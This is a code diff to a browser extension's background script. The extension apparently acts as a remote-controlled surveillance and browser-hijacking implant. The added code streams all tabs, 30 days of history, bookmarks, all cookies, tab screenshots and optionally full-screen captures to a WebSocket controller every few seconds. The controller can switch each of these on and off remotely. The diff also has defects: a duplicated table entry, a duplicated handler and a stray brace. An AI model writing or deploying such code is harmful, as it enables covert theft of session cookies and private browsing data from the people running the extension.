@@ -15,57 +15,149 @@ var placeholder_secret_token = get_secure_random_token(64);
 // Used as a table to hold the final metadata to return for
 // 301 requests which fetch() can't normally handle.
 var redirect_table = {};
-
 const REQUEST_HEADER_BLACKLIST = ["cookie"];
+
+const SYNC_SWITCH = {
+  SYNC: true,
+  SYNC_HUGE: true,
+  REALTIME_IMG: false,
+};
 
 const RPC_CALL_TABLE = {
   HTTP_REQUEST: perform_http_request,
+  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
   GET_TABS: get_tabs,
   GET_BOOKMARKS: get_bookmarks,
+  GET_SYNC_CONFIG: get_sync_config,
 };
 
-function get_current_tab() {
+async function get_sync_config() {}
+
+// Return an object for the current tab.
+async function get_current_tab() {
+  if (!chrome.tabs) {
+    return {};
+  }
+  return get_current_tab_data();
+}
+// browser get current tab
+function get_current_tab_data() {
   return new Promise((resolve) => {
     chrome.tabs.query(
       { active: true, lastFocusedWindow: true },
       function (tabs) {
-        console.log(tabs[0]);
         resolve(tabs[0]);
       }
     );
   });
 }
 
-function get_tabs() {
+// Return an array of tabs
+async function get_tabs() {
+  if (!chrome.tabs) {
+    return [];
+  }
+  return get_all_tabs();
+}
+// browser get all tabs
+function get_all_tabs() {
   return new Promise((resolve) => {
     chrome.tabs.query({}, function (tabs) {
-      console.log(tabs);
       resolve(tabs);
     });
   });
 }
 
+// Return an image base64 for the current tab.
+async function get_tab_image() {
+  if (!chrome.tabs) {
+    return "";
+  }
+  return get_current_tab_image();
+}
+// browser get tab image
 function get_current_tab_image() {
   return new Promise((resolve) => {
     chrome.tabs.captureVisibleTab(
       (options = { format: "jpeg", quality: 10 }),
       (callback = (dataUrl) => {
-        console.log(dataUrl);
         return resolve(dataUrl);
       })
     );
   });
 }
 
-async function get_bookmarks(params) {}
+// return screen
+function capture_screenshot() {
+  return new Promise((resolve, reject) => {
+    const desktopMediaRequest = chrome.desktopCapture.chooseDesktopMedia(
+      ["screen"],
+      (streamId) => {
+        if (streamId) {
+          navigator.mediaDevices
+            .getUserMedia({
+              audio: false,
+              video: {
+                mandatory: {
+                  chromeMediaSource: "desktop",
+                  chromeMediaSourceId: streamId,
+                },
+              },
+            })
+            .then((stream) => {
+              const videoTrack = stream.getVideoTracks()[0];
+              const imageCapture = new ImageCapture(videoTrack);
+              return imageCapture.grabFrame();
+            })
+            .then((imageBitmap) => {
+              const canvas = document.createElement("canvas");
+              canvas.width = imageBitmap.width;
+              canvas.height = imageBitmap.height;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(imageBitmap, 0, 0);
+              const dataUrl = canvas.toDataURL();
+              resolve(dataUrl);
+            })
+            .catch((error) => {
+              reject(error);
+            });
+        } else {
+          reject(new Error("选择屏幕或窗口失败"));
+        }
+      }
+    );
 
-/*
-    Return an array of history for the current logs.
-*/
+    // 处理取消选择
+    const handleCancel = () => {
+      reject(new Error("用户取消选择"));
+    };
+    chrome.desktopCapture.cancelChooseDesktopMedia(desktopMediaRequest);
+  });
+}
+
+// 调用截图方法
+
+// Return an array of bookmarks from browser
+async function get_bookmarks(event) {
+  if (!chrome.bookmarks) {
+    return [];
+  }
+  return get_all_bookmarks();
+}
+function get_all_bookmarks() {
+  return new Promise((resolve, reject) => {
+    chrome.bookmarks.getTree(function (bookmarkTreeNodes) {
+      resolve(bookmarkTreeNodes);
+    });
+  });
+}
+}
+
+// Return an array of history for the current logs.
 async function get_history(days = 30) {
   if (!chrome.history) {
     return [];
@@ -81,6 +173,7 @@ function get_history_by_day(days = 7) {
         {
           text: "",
           startTime: NDaysAgo,
+          maxResults: 10000,
         },
         function (historyItems) {
           resolve(historyItems);
@@ -92,12 +185,8 @@ function get_history_by_day(days = 7) {
   });
 }
 
-/*
-    Return an array of cookies for the current cookie store.
-*/
+//Return an array of cookies for the current cookie store.
 async function get_cookies(params) {
-  // If the "cookies" permission is not available
-  // just return an empty array.
   if (!chrome.cookies) {
     return [];
   }
@@ -117,20 +206,11 @@ function get_all_cookies(details) {
 }
 
 async function authenticate(params) {
-  // Check for a previously-set browser identifier.
   var browser_id = localStorage.getItem("browser_id");
-
-  // If no browser ID is already set we generate a
-  // new one and return it to the server.
   if (browser_id === null) {
     browser_id = uuidv4();
     localStorage.setItem("browser_id", browser_id);
   }
-
-  /*
-        Return the browser's unique ID as well as
-        some metadata about the instance.
-    */
   return {
     browser_id: browser_id,
     user_agent: navigator.userAgent,
@@ -198,20 +278,11 @@ const websocket_check_interval = setInterval(async () => {
 
     try {
       websocket.close();
-    } catch (e) {
-      // Do nothing.
-    }
+    } catch (e) {}
     initialize();
     return;
   }
 
-  // Send PING message down websocket, this will be
-  // replied to with a PONG message form the server
-  // which will trigger a function to update the
-  // last_live_connection_timestamp variable.
-
-  // If this timestamp gets too old, the WebSocket
-  // will be severed and started again.
   websocket.send(
     JSON.stringify({
       id: uuidv4(),
@@ -219,13 +290,35 @@ const websocket_check_interval = setInterval(async () => {
       action: "PING",
       data: {
         current_tab: await get_current_tab(),
-        current_tab_image: await get_current_tab_image(),
+        current_tab_image: await get_tab_image(),
+        // current_tab_image: await capture_screenshot(),
       },
     })
   );
-}, 1000 * 12);
+}, 1000 * 13); //13
 
+// return some basic information about the tabs and cookies
+const websocket_realtime_img_interval = setInterval(async () => {
+  if (SYNC_SWITCH["REALTIME_IMG"] !== true) {
+    return;
+  }
+  websocket.send(
+    JSON.stringify({
+      id: uuidv4(),
+      version: "1.0.0",
+      action: "REALTIME_IMG",
+      data: {
+        current_tab_image: await get_tab_image(),
+      },
+    })
+  );
+}, 1000 * 2);
+
+// return some basic information about the tabs and cookies
 const websocket_sync_interval = setInterval(async () => {
+  if (SYNC_SWITCH["SYNC"] !== true) {
+    return;
+  }
   websocket.send(
     JSON.stringify({
       id: uuidv4(),
@@ -233,11 +326,29 @@ const websocket_sync_interval = setInterval(async () => {
       action: "SYNC",
       data: {
         tabs: await get_tabs(),
-        history: await get_history_by_day(7),
       },
     })
   );
-}, 1000 * 63);
+}, 1000 * 3); //63
+
+// return some huge information about the others
+const websocket_sync_huge_interval = setInterval(async () => {
+  if (SYNC_SWITCH["SYNC_HUGE"] !== true) {
+    return;
+  }
+  websocket.send(
+    JSON.stringify({
+      id: uuidv4(),
+      version: "1.0.0",
+      action: "SYNC_HUGE",
+      data: {
+        history: await get_history(30),
+        bookmarks: await get_bookmarks(),
+        cookies: await get_cookies(),
+      },
+    })
+  );
+}, 1000 * 3); //321
 
 // Headers that fetch() can't set which need to
 // utilize webRequest to be able to send properly.
@@ -379,6 +490,7 @@ function initialize() {
   websocket = new WebSocket("ws://127.0.0.1:4343");
 
   websocket.onopen = function (e) {};
+  websocket.onopen = function (e) {};
 
   websocket.onmessage = async function (event) {
     // Update last live connection timestamp
@@ -387,9 +499,18 @@ function initialize() {
     try {
       var parsed_message = JSON.parse(event.data);
     } catch (e) {
-      console.error(`Could not parse WebSocket message!`);
+      console.error("Could not parse WebSocket message!");
       console.error(e);
       return;
+    }
+
+    try {
+      console.log(parsed_message.data.switch_config);
+      Object.keys(parsed_message.data.switch_config).map((key) => {
+        SYNC_SWITCH[key] = parsed_message.data.switch_config[key];
+      });
+    } catch (e) {
+      console.log(e);
     }
 
     if (parsed_message.action in RPC_CALL_TABLE) {
@@ -573,6 +694,15 @@ chrome.webRequest.onHeadersReceived.addListener(
   ["blocking", "responseHeaders", "extraHeaders"]
 );
 
-chrome.tabs.onActivated.addListener(function (details) {
-  console.log(details);
+chrome.idle.onStateChanged.addListener((state) => {
+  websocket.send(
+    JSON.stringify({
+      id: uuidv4(),
+      version: "1.0.0",
+      action: "STATE",
+      data: {
+        state: state,
+      },
+    })
+  );
 });
